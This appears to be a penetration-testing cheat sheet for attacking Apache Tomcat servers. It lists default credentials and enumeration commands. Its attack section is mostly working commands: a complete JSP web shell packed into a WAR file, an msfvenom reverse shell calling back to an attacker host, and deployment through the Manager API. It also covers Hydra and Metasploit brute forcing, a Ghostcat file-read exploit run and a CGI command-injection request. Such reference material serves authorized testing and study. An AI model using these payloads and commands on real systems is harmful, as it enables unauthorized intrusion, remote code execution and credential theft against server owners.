#Tomcat #ApacheTomcat #Java #webapp #webservices

## What is Tomcat?
Apache Tomcat — open-source Java servlet container and web server. Implements Java Servlet and JSP specifications. Commonly found on port 8080/8443. The Manager Application (`/manager/html`) allows WAR file deployment — primary attack surface.

- Port: **TCP 8080** — HTTP
- Port: **TCP 8443** — HTTPS
- Port: **TCP 8009** — AJP connector (Ghostcat attack surface)
- Port: **TCP 8005** — shutdown command port
- Manager app: `/manager/html` and `/manager/text`
- Host Manager: `/host-manager/html`

---

## Default Config Files

| File | Path |
|---|---|
| Main config | `$CATALINA_HOME/conf/server.xml` |
| User credentials | `$CATALINA_HOME/conf/tomcat-users.xml` |
| Web app deployment | `$CATALINA_HOME/webapps/` |
| Logs | `$CATALINA_HOME/logs/catalina.out` |

---

## Default Credentials

```
admin/admin
admin/tomcat
admin/password
tomcat/tomcat
tomcat/s3cret
manager/manager
root/root
```

```bash
# Check tomcat-users.xml for credentials
cat /opt/tomcat/conf/tomcat-users.xml
cat /etc/tomcat*/tomcat-users.xml
find / -name "tomcat-users.xml" 2>/dev/null
```

---

## Enumeration

```bash
# Nmap
nmap -p 8080,8443,8009 --script http-title,http-auth-finder,tomcat-headers -sV <target>

# Check version + manager
curl -s http://<target>:8080/
curl -s http://<target>:8080/manager/html -u tomcat:tomcat

# gobuster for apps
gobuster dir -u http://<target>:8080 -w /usr/share/seclists/Discovery/Web-Content/tomcat.txt
gobuster dir -u http://<target>:8080 -w /usr/share/wordlists/dirb/common.txt

# Metasploit
use auxiliary/scanner/http/tomcat_enum
use auxiliary/scanner/http/tomcat_mgr_login
```

---

## Connect / Access

```bash
# Access manager app (browser)
http://<target>:8080/manager/html

# Manager text API (programmatic)
curl -u <user>:<pass> http://<target>:8080/manager/text/list
curl -u <user>:<pass> http://<target>:8080/manager/text/serverinfo

# List deployed apps
curl -u <user>:<pass> http://<target>:8080/manager/text/list
```

---

## Attack Vectors

### Manager App — WAR File Upload → JSP Shell

```bash
# Create malicious WAR file
# Option 1: msfvenom
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f war -o shell.war

# Option 2: manual JSP shell in WAR
mkdir -p webshell/WEB-INF
cat > webshell/cmd.jsp << 'EOF'
<%@ page import="java.io.*" %>
<% String cmd = request.getParameter("cmd"); Process p = Runtime.getRuntime().exec(cmd); BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream())); String line; while ((line = br.readLine()) != null) { out.println(line + "<br>"); } %>
EOF
cd webshell && jar -cvf ../shell.war .

# Upload via Manager GUI
# Go to http://host:8080/manager/html → "WAR file to deploy" → select shell.war

# Upload via curl
curl -u <user>:<pass> -T shell.war "http://<target>:8080/manager/text/deploy?path=/shell&update=true"

# Access shell
curl "http://<target>:8080/shell/cmd.jsp?cmd=id"

# Metasploit
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS <target>
set RPORT 8080
set HttpUsername <user>
set HttpPassword <pass>
set LHOST <attacker_ip>
run
```

### Brute Force Manager Credentials

```bash
# Metasploit
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS <target>
set RPORT 8080
run

# Hydra (HTTP basic auth)
hydra -L users.txt -P passwords.txt <target> -s 8080 http-get /manager/html

# Manual
curl -u admin:admin http://<target>:8080/manager/html -o /dev/null -w "%{http_code}"
```

### CVE-2020-1938 — Ghostcat (AJP File Read/Inclusion)

Affects Tomcat 9 < 9.0.31, 8 < 8.5.51, 7 < 7.0.100. AJP connector on port 8009 allows unauthenticated file read from webapps directory. If file upload exists, achieves RCE.

```bash
# Check if AJP port is open
nmap -p 8009 -sV <target>

# Exploit (PoC)
git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
python3 CNVD-2020-10487-Tomcat-Ajp-lfi.py <target> -p 8009 -f WEB-INF/web.xml

# Metasploit
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS <target>
run

# Read web.xml (may contain credentials)
python3 exploit.py <target> -p 8009 -f WEB-INF/web.xml
```

### CVE-2019-0232 — CGI RCE (Windows, enableCmdLineArguments)

Affects Windows Tomcat with `enableCmdLineArguments=true` in CGI config.

```bash
curl "http://<target>:8080/cgi-bin/script.bat?&dir"
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| Default/weak manager credentials | WAR upload → RCE |
| Manager app exposed to network | Brute force attack surface |
| AJP connector enabled (8009) | Ghostcat file read/RCE |
| Old Tomcat version | Multiple known CVEs |
| Shutdown port 8005 accessible | Remote shutdown |
| Verbose error pages | Version and path disclosure |

---

## Quick Reference

| Goal | Command |
|---|---|
| Access manager | `http://host:8080/manager/html` |
| Brute force | `msf: auxiliary/scanner/http/tomcat_mgr_login` |
| WAR shell (msfvenom) | `msfvenom -p java/jsp_shell_reverse_tcp ... -f war -o shell.war` |
| Upload WAR (curl) | `curl -u user:pass -T shell.war "http://host:8080/manager/text/deploy?path=/shell"` |
| Ghostcat check | `nmap -p 8009 host` |
| Read web.xml (Ghostcat) | `python3 exploit.py host -p 8009 -f WEB-INF/web.xml` |
| MSF WAR upload | `msf: exploit/multi/http/tomcat_mgr_upload` |
